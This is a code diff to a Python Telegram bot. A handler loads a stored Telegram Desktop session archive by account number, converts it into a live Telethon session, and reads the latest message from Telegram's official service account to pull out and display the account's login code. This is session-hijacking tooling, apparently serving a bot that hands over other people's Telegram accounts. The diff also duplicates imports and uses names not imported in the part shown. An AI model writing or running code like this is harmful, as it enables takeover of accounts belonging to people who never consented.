@@ -487,17 +487,18 @@ async def retrieve_options(client, callback_query):
 import re
 import tempfile, zipfile, shutil, os, base64
 from telethon import TelegramClient
-from tdata_converter import convert_tdata
-
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+import tempfile, os, base64, zipfile, shutil, re
 
 @Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
 async def get_code(client, callback_query):
-    uid = int(callback_query.data.split("_")[1])
+    acc_num = int(callback_query.data.split("_")[1])
     doc = await db.col.find_one({"account_num": acc_num})
     if not doc:
         return await callback_query.message.edit("❌ Account not found.")
 
-    # Prepare tdata temp folder
+    # Prepare temp folder
     temp_dir = tempfile.mkdtemp()
     tdata_zip = os.path.join(temp_dir, "tdata.zip")
     with open(tdata_zip, "wb") as f:
@@ -508,28 +509,34 @@ async def get_code(client, callback_query):
         zip_ref.extractall(extract_dir)
 
     try:
-        # Convert tdata → Telethon session
-        session = convert_tdata(extract_dir, API_ID, API_HASH)
+        # Inline TDesktop → Telethon conversion
+        tdesk = TDesktop(extract_dir)
+        if not tdesk.isLoaded():
+            return await callback_query.answer("⚠️ Failed to load (corrupted tdata)", show_alert=True)
 
-        async with TelegramClient(session, API_ID, API_HASH) as tele:
-            # Get last message from official Telegram (777000)
-            msgs = await tele.get_messages(777000, limit=1)
-            if not msgs:
-                return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)
+        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
+        await tele_client.connect()
 
-            text = msgs[0].message
-            match = re.search(r"Login code[:\s]+(\d{5})", text)
-            if match:
-                code = match.group(1)
-                await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
-            else:
-                await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)
+        if not await tele_client.is_user_authorized():
+            return await callback_query.answer("⚠️ Not authorized (needs login / 2FA)", show_alert=True)
+
+        # Fetch code from official Telegram (777000)
+        msgs = await tele_client.get_messages(777000, limit=1)
+        if not msgs:
+            return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)
+
+        text = msgs[0].message
+        match = re.search(r"Login code[:\s]+(\d{5})", text)
+        if match:
+            code = match.group(1)
+            await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
+        else:
+            await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)
 
     except Exception as e:
         await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
     finally:
         shutil.rmtree(temp_dir)
-
 
 from pyrogram import Client, filters
 
